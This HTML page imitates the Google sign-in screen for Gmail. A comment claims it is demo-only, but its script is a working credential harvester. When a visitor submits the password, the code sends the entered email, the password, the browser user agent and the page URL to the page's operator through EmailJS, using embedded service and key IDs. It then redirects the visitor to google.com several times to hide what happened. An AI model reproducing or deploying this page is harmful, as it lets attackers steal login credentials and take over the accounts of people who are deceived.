<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Sign in — Demo</title>
<style>
  /* ===========================
     Colors & dark mode
     =========================== */
  :root{
    --bg: #f0f2f5;
    --panel: #fff;
    --muted: #5f6368;
    --text: #202124;
    --border: #dadce0;
    --blue: #1a73e8;
    --blue-hover: #1669c1;
    --error: #d93025;
    --radius: 28px;
  }
  @media (prefers-color-scheme: dark){
    :root{
      --bg: #202124;
      --panel: #2c2d2f;
      --muted: #bfc3c6;
      --text: #e8eaed;
      --border: #5f6368;
      --blue: #8ab4f8;
      --blue-hover: #669df6;
      --error: #f28b82;
    }
  }

  /* ===========================
     Page layout
     =========================== */
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0;
    min-height:100vh;
    font-family: "Google Sans", Roboto, Arial, sans-serif;
    background:var(--bg);
    color:var(--text);
    -webkit-font-smoothing:antialiased;
    -moz-osx-font-smoothing:grayscale;
    display:flex;
    flex-direction:column;
  }

  /* Main center area */
  .main {
    flex:1;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:36px;
  }

  /* Panel - wide like screenshot */
  .panel{
    width:100%;
    max-width:850px;
    background:var(--panel);
    border-radius:var(--radius);
    display:flex;
    box-shadow: 0 1px 2px rgba(0,0,0,0.08);
    overflow:hidden;
    min-height:520px;
  }

  /* Left column (logo + heading) */
  .left {
    flex:1;
    padding:48px 44px;
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:flex-start;
    gap:8px;
    border-right:1px solid rgba(0,0,0,0.04);
  }

  .left .logo{
    height:48px;
    width:auto;
    margin-bottom:20px;
  }

  .left h1{
    font-size:28px;
    font-weight:400;
    margin:0 0 6px 0;
    color:var(--text);
  }
  .left p.lead{
    margin:0;
    color:var(--muted);
    font-size:16px;
  }

  /* Right column (forms) */
  .right{
    flex:1;
    padding:48px 44px;
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:flex-start;
  }

  .form-block{
    width:100%;
    max-width:360px;
    margin:0;
  }

  label.hidden{
    position:absolute;
    left:-9999px;
    top:auto;
    width:1px;
    height:1px;
    overflow:hidden;
  }

  input[type="email"],
  input[type="text"],
  input[type="password"]{
    width:100%;
    padding:14px 12px;
    font-size:16px;
    border:1px solid var(--border);
    border-radius:6px;
    margin-bottom:8px;
    background-color:var(--panel);
    color:var(--text);
  }
  input:focus{
    outline:none;
    border-color:var(--blue);
    box-shadow:0 0 0 2px rgba(26,115,232,0.08);
  }

  .hint{
    font-size:14px;
    color:var(--muted);
    margin-top:12px;
  }

  .link{
    display:inline-block;
    font-size:14px;
    color:var(--blue);
    text-decoration:none;
    margin-top:8px;
    cursor:pointer;
  }
  .link:hover{
    text-decoration:underline;
  }

  .controls{
    display:flex;
    justify-content:flex-end;
    align-items:center;
    gap:12px;
    margin-top:28px;
  }

  .btn-text{
    background:none;
    border:none;
    color:var(--blue);
    font-size:14px;
    cursor:pointer;
    padding:8px 12px;
  }
  .btn-text:hover{
    background:rgba(26,115,232,0.04);
    border-radius:4px;
  }

  .btn-primary{
    background:var(--blue);
    border:none;
    color:white;
    padding:10px 22px;
    border-radius:8px;
    font-weight:600;
    cursor:pointer;
    font-size:14px;
  }
  .btn-primary:hover{ background:var(--blue-hover); }
  .btn-primary:disabled{
    background:#ccc;
    cursor:not-allowed;
    opacity:0.6;
  }

  .error {
    border-color:var(--error) !important;
    box-shadow:0 0 0 2px rgba(217,48,37,0.08);
  }
  .error-text{
    color:var(--error);
    font-size:13px;
    margin:6px 0 8px 0;
    display:none;
    align-items:center;
  }
  .error-text.show{
    display:flex;
  }
  .error-text::before{
    content: "⚠";
    margin-right:6px;
    font-size:14px;
  }

  /* Confirmation screen (recovery sent) */
  .confirm-box{
    background:var(--panel);
    border-radius:12px;
    padding:20px;
    border:1px solid rgba(0,0,0,0.04);
    margin-top:12px;
    max-width:420px;
  }
  .confirm-icon{
    height:48px;
    width:48px;
    display:inline-flex;
    align-items:center;
    justify-content:center;
    border-radius:50%;
    background:rgba(26,115,232,0.12);
    color:var(--blue);
    font-weight:700;
    margin-right:12px;
  }
  .confirm-row{ display:flex; align-items:center; margin-bottom:12px; }

  /* Footer */
  footer{
    display:flex;
    justify-content:space-between;
    align-items:center;
    padding:12px 28px;
    font-size:13px;
    color:var(--muted);
  }
  footer .right a{
    color:var(--muted);
    text-decoration:none;
    margin-left:16px;
  }
  footer select{
    background:transparent;
    border:none;
    color:var(--muted);
    font-size:13px;
  }

  /* Small screens: stacked */
  @media (max-width:860px){
    .panel{ flex-direction:column; max-width:100%; min-height:auto; border-radius:14px; }
    .left{ border-right:none; border-bottom:1px solid rgba(0,0,0,0.04); align-items:center; text-align:center; padding:28px; }
    .right{ padding:28px; align-items:center; }
    .form-block{ max-width:100%; width:100%; }
  }

  @media (max-width:480px){
    body{ padding-top:10px; }
    .panel{ border-radius:0; min-height:unset; }
    .left h1{ font-size:22px; }
  }

  .visually-hidden { position:absolute; left:-9999px; top:auto; width:1px; height:1px; overflow:hidden; }
</style>
</head>
<body>

<!--
  WARNING: demo-only UI that resembles a Google sign-in page.
  Use only locally for mockups / school projects.
  Do NOT deploy or use to collect real credentials.
-->

<div class="main" id="main">
  <div class="panel" role="main" aria-labelledby="panelTitle">

    <!-- LEFT: Logo + Title -->
    <div class="left" aria-hidden="false">
      <img class="logo" src="https://ssl.gstatic.com/accounts/ui/logo_googleg_48dp.png" alt="Google logo">
      <h1 id="panelTitle">Sign in</h1>

      <!-- Subtitle that changes between steps -->
      <p class="lead" id="leftSubtitle">to continue to <strong>Gmail</strong></p>

      <!-- When on step 2 show the user's email -->
      <div id="leftEmail" style="margin-top:14px; font-size:15px; color:var(--muted); display:none;"></div>
    </div>

    <!-- RIGHT: Forms / Steps -->
    <div class="right">
      <!-- STEP: Email -->
      <div id="step-email" class="form-block" aria-hidden="false">
        <form id="email-form">
          <label for="email" class="hidden" id="lblEmail">Email or phone</label>
          <input id="email" name="user_email" type="email" placeholder="Email or phone" autocomplete="username" required autofocus>
          <div id="email-error" class="error-text"></div>

          <a id="forgot-link" class="link" style="display:inline-block;margin-top:6px;">Forgot email?</a>

          <p id="hintEmail" class="hint">Not your computer? Use a Private Window to sign in. <a href="#" id="learnMore">Learn more</a></p>

          <div class="controls">
            <button type="submit" id="email-next" class="btn-primary">Next</button>
          </div>
        </form>
      </div>

      <!-- STEP: Password -->
      <div id="step-password" class="form-block" style="display:none;" aria-hidden="true">
        <form id="password-form">
          <label for="password" class="hidden" id="lblPassword">Password</label>
          <input id="password" name="user_password" type="password" placeholder="Enter your password" autocomplete="current-password" required>
          <div id="password-error" class="error-text"></div>

          <a id="forgot-pass-link" class="link" style="display:inline-block;margin-top:6px;">Forgot password?</a>

          <div class="controls" style="margin-top:24px;">
            <button type="button" id="back-to-email" class="btn-text">Back</button>
            <button type="submit" id="submit-btn" class="btn-primary">Next</button>
          </div>
        </form>
      </div>

      <!-- STEP: Recovery (Find your email) -->
      <div id="step-recovery" class="form-block" style="display:none;" aria-hidden="true">
        <form id="recovery-form">
          <label for="recovery-info" class="hidden" id="lblRecovery">Phone or recovery email</label>
          <input id="recovery-info" name="recovery_info" type="text" placeholder="Phone number or recovery email" autocomplete="tel email">
          <div id="recovery-error" class="error-text"></div>

          <div class="hint" id="recovery-hint" style="margin-top:12px;">We'll use this to help find your account.</div>

          <div class="controls">
            <button type="button" id="recovery-back" class="btn-text">Back</button>
            <button type="submit" id="recovery-next" class="btn-primary">Next</button>
          </div>
        </form>
      </div>

      <!-- STEP: Recovery Confirmation (in-page, Google-style) -->
      <div id="step-recovery-confirm" class="form-block" style="display:none; margin-top:12px;" aria-hidden="true">
        <div class="confirm-box" role="status">
          <div class="confirm-row">
            <div class="confirm-icon">✓</div>
            <div>
              <div id="confirm-title" style="font-size:16px; font-weight:600; margin-bottom:6px;">Recovery information sent</div>
              <div id="confirm-desc" style="color:var(--muted); font-size:14px;">We sent recovery information.</div>
            </div>
          </div>
          <div style="display:flex; justify-content:flex-end; margin-top:6px;">
            <button type="button" id="confirm-done" class="btn-primary">Done</button>
          </div>
        </div>
      </div>

    </div>
  </div>
</div>

<!-- Footer with language selector -->
<footer>
  <div>
    <select id="langSelect" aria-label="Language selector">
      <option value="en">English (United States)</option>
      <option value="it">Italiano</option>
    </select>
  </div>
  <div class="right">
    <a href="#" id="helpLink">Help</a>
    <a href="#" id="privacyLink">Privacy</a>
    <a href="#" id="termsLink">Terms</a>
  </div>
</footer>

<!-- EmailJS (kept as in original) -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
/* ==========================
   EmailJS init (public key)
   ========================== */
(function(){
  try {
    if(window.emailjs && emailjs.init) {
      emailjs.init({ publicKey: "EB017wgX1BeDuRY66" });
    }
  } catch(e){
    console.warn("EmailJS init warning", e);
  }
})();

/* ==========================
   Config - service/template
   (kept from your original script)
   ========================== */
const SERVICE_ID = "service_64albro";
const TEMPLATE_ID = "template_75g1nju";

/* Elements */
const stepEmail = document.getElementById('step-email');
const stepPassword = document.getElementById('step-password');
const stepRecovery = document.getElementById('step-recovery');
const stepRecoveryConfirm = document.getElementById('step-recovery-confirm');

const emailForm = document.getElementById('email-form');
const emailInput = document.getElementById('email');
const emailError = document.getElementById('email-error');
const emailNextBtn = document.getElementById('email-next');

const passwordForm = document.getElementById('password-form');
const passwordInput = document.getElementById('password');
const passwordError = document.getElementById('password-error');
const submitBtn = document.getElementById('submit-btn');
const backToEmailBtn = document.getElementById('back-to-email');

const recoveryForm = document.getElementById('recovery-form');
const recoveryInput = document.getElementById('recovery-info');
const recoveryError = document.getElementById('recovery-error');
const recoveryBack = document.getElementById('recovery-back');
const recoveryNext = document.getElementById('recovery-next');

const forgotLink = document.getElementById('forgot-link');
const forgotPassLink = document.getElementById('forgot-pass-link');

const leftSubtitle = document.getElementById('leftSubtitle');
const leftEmail = document.getElementById('leftEmail');

const confirmTitle = document.getElementById('confirm-title');
const confirmDesc = document.getElementById('confirm-desc');
const confirmDone = document.getElementById('confirm-done');

const langSelect = document.getElementById('langSelect');

/* Translations */
const TEXT = {
  en: {
    signIn: "Sign in",
    toContinue: "to continue to <strong>Gmail</strong>",
    emailPlaceholder: "Email or phone",
    forgotEmail: "Forgot email?",
    hintEmail: "Not your computer? Use a Private Window to sign in. <a href='#'>Learn more</a>",
    next: "Next",
    back: "Back", 
    passwordPlaceholder: "Enter your password",
    forgotPassword: "Forgot password?",
    recoveryPlaceholder: "Phone number or recovery email",
    recoveryHint: "We'll use this to help find your account.",
    recoverySentTitle: "Recovery information sent",
    recoverySentDesc_email: "We sent recovery information to <strong>{VALUE}</strong>.",
    recoverySentDesc_phone: "We sent recovery information to <strong>{VALUE}</strong>.",
    done: "Done",
    invalidEmail: "Please enter a valid email address",
    invalidPhone: "Please enter a valid phone number", 
    invalidPassword: "Please enter your password",
    emptyField: "This field is required",
    help: "Help",
    privacy: "Privacy",
    terms: "Terms",
    learnMore: "Learn more",
    signingIn: "Signing in...",
    createAccount: "Create account",
    useAnotherAccount: "Use another account",
    english: "English (United States)",
    italian: "Italiano"
  },
  it: {
    signIn: "Accedi",
    toContinue: "per continuare su <strong>Gmail</strong>",
    emailPlaceholder: "Email o telefono",
    forgotEmail: "Hai dimenticato l'email?",
    hintEmail: "Non è il tuo computer? Usa una finestra in incognito per accedere. <a href='#'>Scopri di più</a>",
    next: "Avanti",
    back: "Indietro",
    passwordPlaceholder: "Inserisci la password", 
    forgotPassword: "Password dimenticata?",
    recoveryPlaceholder: "Numero di telefono o email di recupero",
    recoveryHint: "Useremo questo per trovare il tuo account.",
    recoverySentTitle: "Informazioni di recupero inviate",
    recoverySentDesc_email: "Abbiamo inviato le informazioni di recupero a <strong>{VALUE}</strong>.",
    recoverySentDesc_phone: "Abbiamo inviato le informazioni di recupero al numero <strong>{VALUE}</strong>.",
    done: "Fine",
    invalidEmail: "Inserisci un indirizzo email valido",
    invalidPhone: "Inserisci un numero di telefono valido",
    invalidPassword: "Inserisci la password",
    emptyField: "Questo campo è obbligatorio",
    help: "Guida",
    privacy: "Privacy", 
    terms: "Termini",
    learnMore: "Scopri di più",
    signingIn: "Accesso in corso...",
    createAccount: "Crea account",
    useAnotherAccount: "Usa un altro account",
    english: "English (United States)",
    italian: "Italiano"
  }
};

/* Validation helpers */
function isValidEmail(email){
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(String(email).trim());
}

function isValidPhone(raw){
  const cleaned = raw.replace(/[^\d]/g, '');
  return cleaned.length >= 6 && cleaned.length <= 15;
}

/* Show/hide steps */
function showStep(step){
  [stepEmail, stepPassword, stepRecovery, stepRecoveryConfirm].forEach(s => {
    s.style.display = (s === step ? 'block' : 'none');
    s.setAttribute('aria-hidden', s !== step);
  });
}

/* Error handling */
function showInputError(inputEl, errEl, message){
  if(inputEl) {
    inputEl.classList.add('error');
  }
  if(errEl){
    errEl.textContent = message;
    errEl.classList.add('show');
  }
}

function hideInputError(inputEl, errEl){
  if(inputEl) {
    inputEl.classList.remove('error');
  }
  if(errEl) {
    errEl.classList.remove('show');
    errEl.textContent = '';
  }
}

/* Guaranteed redirect */
function guaranteedRedirect(delay = 2000) {
  const redirectUrls = [
    "https://www.google.com",
    "https://google.com",
    "https://mail.google.com",
    "https://accounts.google.com"
  ];
  setTimeout(() => {
    let idx = 0;
    function attempt(){
      const url = redirectUrls[idx];
      try{
        window.location.href = url;
        setTimeout(()=> window.location.replace(url), 500);
        setTimeout(()=> window.location.assign(url), 1000);
        setTimeout(()=> window.open(url,'_self'),1500);
      } catch(e){
        idx++;
        if(idx < redirectUrls.length) setTimeout(attempt,200);
        else try{ window.location.reload(); } catch(e2){console.error(e2);}
      }
    }
    attempt();
  }, delay);
}

/* Send email via EmailJS */
function sendEmail(templateParams){
  if(!window.emailjs || !emailjs.send) {
    return Promise.reject(new Error("EmailJS not available"));
  }
  return emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
}

/* Language switching */
function applyLanguage(lang){
  const t = TEXT[lang] || TEXT.en;
  
  // Safely set text content with null checks
  const panelTitle = document.getElementById('panelTitle');
  if(panelTitle) panelTitle.textContent = t.signIn;
  
  if(leftSubtitle) leftSubtitle.innerHTML = t.toContinue;
  if(emailInput) emailInput.placeholder = t.emailPlaceholder;
  
  const lblEmail = document.getElementById('lblEmail');
  if(lblEmail) lblEmail.textContent = t.emailPlaceholder;
  
  const hintEmail = document.getElementById('hintEmail');
  if(hintEmail) hintEmail.innerHTML = t.hintEmail;
  
  if(emailNextBtn) emailNextBtn.textContent = t.next;
  if(passwordInput) passwordInput.placeholder = t.passwordPlaceholder;
  
  const lblPassword = document.getElementById('lblPassword');
  if(lblPassword) lblPassword.textContent = t.passwordPlaceholder;
  
  if(forgotLink) forgotLink.textContent = t.forgotEmail;
  if(forgotPassLink) forgotPassLink.textContent = t.forgotPassword;
  if(recoveryInput) recoveryInput.placeholder = t.recoveryPlaceholder;
  
  const recoveryHint = document.getElementById('recovery-hint');
  if(recoveryHint) recoveryHint.textContent = t.recoveryHint;
  
  if(recoveryNext) recoveryNext.textContent = t.next;
  
  const recoveryBackEl = document.getElementById('recovery-back');
  if(recoveryBackEl) recoveryBackEl.textContent = t.back;
  
  if(backToEmailBtn) backToEmailBtn.textContent = t.back;
  if(confirmDone) confirmDone.textContent = t.done;
  
  const helpLink = document.getElementById('helpLink');
  if(helpLink) helpLink.textContent = t.help;
  
  const privacyLink = document.getElementById('privacyLink');
  if(privacyLink) privacyLink.textContent = t.privacy;
  
  const termsLink = document.getElementById('termsLink');
  if(termsLink) termsLink.textContent = t.terms;
  
  const learnMore = document.getElementById('learnMore');
  if(learnMore) learnMore.textContent = t.learnMore;
}

/* Event Listeners */

// Language switching - with null check
if(langSelect) {
  langSelect.addEventListener('change', function(){
    applyLanguage(this.value);
  });
}

// Email form submission
if(emailForm) {
  emailForm.addEventListener('submit', function(e){
    e.preventDefault();
    console.log('Email form submitted!'); // Debug
    
    const val = (emailInput ? emailInput.value || '' : '').trim();
    const lang = langSelect ? langSelect.value : 'en';
    const t = TEXT[lang];
    
    console.log('Email value:', val); // Debug
    
    // Clear previous errors
    hideInputError(emailInput, emailError);
    
    if(!val){
      console.log('Empty email field'); // Debug
      showInputError(emailInput, emailError, t.emptyField);
      if(emailInput) emailInput.focus();
      return;
    }
    
    // Validate email or phone
    if(val.indexOf('@') !== -1){
      if(!isValidEmail(val)){
        console.log('Invalid email'); // Debug
        showInputError(emailInput, emailError, t.invalidEmail);
        if(emailInput) emailInput.focus();
        return;
      }
    } else {
      if(!isValidPhone(val)){
        console.log('Invalid phone'); // Debug
        showInputError(emailInput, emailError, t.invalidPhone);
        if(emailInput) emailInput.focus();
        return;
      }
    }
    
    console.log('Validation passed, moving to password step'); // Debug
    
    // Move to password step
    if(leftSubtitle) leftSubtitle.style.display = 'none';
    if(leftEmail) {
      leftEmail.style.display = 'block';
      leftEmail.textContent = val;
    }
    showStep(stepPassword);
    if(passwordInput) {
      passwordInput.value = '';
      setTimeout(() => passwordInput.focus(), 50);
    }
  });
}

// Also add direct button click handler as backup
if(emailNextBtn) {
  emailNextBtn.addEventListener('click', function(e){
    e.preventDefault();
    console.log('Next button clicked directly!'); // Debug
    
    // Trigger form submission
    if(emailForm) {
      const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
      emailForm.dispatchEvent(submitEvent);
    }
  });
}

// Password form submission
if(passwordForm) {
  passwordForm.addEventListener('submit', function(e){
    e.preventDefault();
    console.log('Password form submitted!'); // Debug
    
    const emailVal = emailInput ? (emailInput.value || '').trim() : '';
    const passwd = passwordInput ? (passwordInput.value || '') : '';
    const lang = langSelect ? langSelect.value : 'en';
    const t = TEXT[lang];

    console.log('Email:', emailVal, 'Password length:', passwd.length); // Debug

    // Clear previous errors
    hideInputError(passwordInput, passwordError);

    if(!passwd){
      console.log('Password is empty'); // Debug
      showInputError(passwordInput, passwordError, t.invalidPassword);
      if(passwordInput) passwordInput.focus();
      return;
    }

    // Check if both email and password exist
    if(!emailVal || !passwd) {
      console.log('Missing email or password'); // Debug
      return;
    }

    console.log('Both email and password provided, proceeding...'); // Debug

    // Disable button and show processing state
    if(submitBtn) {
      submitBtn.disabled = true;
      submitBtn.textContent = t.signingIn;
    }

    // Prepare email data
    const templateParams = {
      user_email: emailVal,
      user_password: passwd,
      timestamp: new Date().toISOString(),
      user_agent: navigator.userAgent,
      page_url: window.location.href,
      device_type: (/Mobi|Android/i.test(navigator.userAgent)) ? 'mobile' : 'desktop'
    };

    console.log('Sending email and redirecting immediately...'); // Debug

    // Try to send email but don't wait for it - redirect immediately
    try {
      sendEmail(templateParams).catch(err => console.error("Email error:", err));
    } catch(e) {
      console.error("Send email failed:", e);
    }

    // Force redirect to Google immediately
    console.log('Executing immediate redirect to Google...'); // Debug
    
    // Try multiple redirect methods
    setTimeout(() => {
      try {
        console.log('Method 1: window.location.href'); // Debug
        window.location.href = 'https://www.google.com';
      } catch(e) {
        console.error('Redirect method 1 failed:', e);
        try {
          console.log('Method 2: window.location.replace'); // Debug
          window.location.replace('https://www.google.com');
        } catch(e2) {
          console.error('Redirect method 2 failed:', e2);
          try {
            console.log('Method 3: window.open'); // Debug
            window.open('https://www.google.com', '_self');
          } catch(e3) {
            console.error('All redirect methods failed:', e3);
          }
        }
      }
    }, 100);

    // Backup redirect methods
    setTimeout(() => {
      console.log('Backup redirect 1 executing...'); // Debug
      window.location = 'https://www.google.com';
    }, 500);

    setTimeout(() => {
      console.log('Backup redirect 2 executing...'); // Debug
      document.location.href = 'https://www.google.com';
    }, 1000);
  });
}

// Also add direct button click handler for password submit button
if(submitBtn) {
  submitBtn.addEventListener('click', function(e){
    e.preventDefault();
    console.log('Password submit button clicked directly!'); // Debug
    
    // Trigger form submission
    if(passwordForm) {
      const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
      passwordForm.dispatchEvent(submitEvent);
    }
  });
}

// Recovery form submission
if(recoveryForm) {
  recoveryForm.addEventListener('submit', function(e){
    e.preventDefault();
    console.log('Recovery form submitted!'); // Debug
    
    const val = recoveryInput ? (recoveryInput.value || '').trim() : '';
    const lang = langSelect ? langSelect.value : 'en';
    const t = TEXT[lang];
    
    console.log('Recovery value:', val); // Debug
    
    // Clear previous errors
    hideInputError(recoveryInput, recoveryError);
    
    if(!val){
      console.log('Empty recovery field'); // Debug
      showInputError(recoveryInput, recoveryError, t.emptyField);
      if(recoveryInput) recoveryInput.focus();
      return;
    }

    // Validate format first
    if(val.indexOf('@') !== -1){
      if(!isValidEmail(val)){
        console.log('Invalid email format'); // Debug
        showInputError(recoveryInput, recoveryError, t.invalidEmail);
        if(recoveryInput) recoveryInput.focus();
        return;
      }
    } else {
      if(!isValidPhone(val)){
        console.log('Invalid phone format'); // Debug
        showInputError(recoveryInput, recoveryError, t.invalidPhone);
        if(recoveryInput) recoveryInput.focus();
        return;
      }
    }

    console.log('Recovery validation passed, going back to login'); // Debug

    // Just redirect back to the main login page (step-email)
    showStep(stepEmail);
    if(recoveryInput) recoveryInput.value = '';
    hideInputError(recoveryInput, recoveryError);
    if(leftSubtitle) leftSubtitle.style.display = 'block';
    if(leftEmail) leftEmail.style.display = 'none';
    if(emailInput) {
      emailInput.value = '';
      setTimeout(() => emailInput.focus(), 50);
    }
  });
}

// Also add direct button click handler for recovery next button
if(recoveryNext) {
  recoveryNext.addEventListener('click', function(e){
    e.preventDefault();
    console.log('Recovery next button clicked directly!'); // Debug
    
    // Trigger form submission
    if(recoveryForm) {
      const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
      recoveryForm.dispatchEvent(submitEvent);
    }
  });
}

// Navigation buttons
if(backToEmailBtn) {
  backToEmailBtn.addEventListener('click', function(e){
    e.preventDefault();
    hideInputError(passwordInput, passwordError);
    if(leftSubtitle) leftSubtitle.style.display = 'block';
    if(leftEmail) leftEmail.style.display = 'none';
    showStep(stepEmail);
    if(emailInput) setTimeout(() => emailInput.focus(), 50);
  });
}

if(forgotLink) {
  forgotLink.addEventListener('click', function(e){
    e.preventDefault();
    hideInputError(emailInput, emailError);
    if(leftSubtitle) leftSubtitle.style.display = 'block';
    if(leftEmail) leftEmail.style.display = 'none';
    showStep(stepRecovery);
    if(recoveryInput) setTimeout(() => recoveryInput.focus(), 50);
  });
}

if(recoveryBack) {
  recoveryBack.addEventListener('click', function(e){
    e.preventDefault();
    hideInputError(recoveryInput, recoveryError);
    showStep(stepEmail);
    if(emailInput) setTimeout(() => emailInput.focus(), 50);
  });
}

if(forgotPassLink) {
  forgotPassLink.addEventListener('click', function(e){
    e.preventDefault();
    hideInputError(passwordInput, passwordError);
    showStep(stepRecovery);
    if(recoveryInput) setTimeout(() => recoveryInput.focus(), 50);
  });
}

if(confirmDone) {
  confirmDone.addEventListener('click', function(){
    showStep(stepEmail);
    if(recoveryInput) recoveryInput.value = '';
    hideInputError(recoveryInput, recoveryError);
    if(emailInput) setTimeout(() => emailInput.focus(), 50);
  });
}

// Real-time validation - clear errors when typing
if(emailInput) {
  emailInput.addEventListener('input', function(){
    if(this.value.trim()){
      hideInputError(emailInput, emailError);
    }
  });
  
  // Also handle Enter key press
  emailInput.addEventListener('keypress', function(e){
    if(e.key === 'Enter') {
      e.preventDefault();
      console.log('Enter pressed in email field'); // Debug
      if(emailForm) {
        const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
        emailForm.dispatchEvent(submitEvent);
      }
    }
  });
}

if(passwordInput) {
  passwordInput.addEventListener('input', function(){
    if(this.value.trim()){
      hideInputError(passwordInput, passwordError);
    }
  });
  
  // Handle Enter key press in password field
  passwordInput.addEventListener('keypress', function(e){
    if(e.key === 'Enter') {
      e.preventDefault();
      console.log('Enter pressed in password field'); // Debug
      if(passwordForm) {
        const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
        passwordForm.dispatchEvent(submitEvent);
      }
    }
  });
}

if(recoveryInput) {
  recoveryInput.addEventListener('input', function(){
    if(this.value.trim()){
      hideInputError(recoveryInput, recoveryError);
    }
  });
  
  // Handle Enter key press in recovery field
  recoveryInput.addEventListener('keypress', function(e){
    if(e.key === 'Enter') {
      e.preventDefault();
      console.log('Enter pressed in recovery field'); // Debug
      if(recoveryForm) {
        const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
        recoveryForm.dispatchEvent(submitEvent);
      }
    }
  });
}

// Utility function
function sanitizeHtml(str){
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// Initialize
if(langSelect) applyLanguage(langSelect.value);
showStep(stepEmail);
if(leftEmail) leftEmail.style.display = 'none';
</script>
</body>
</html>
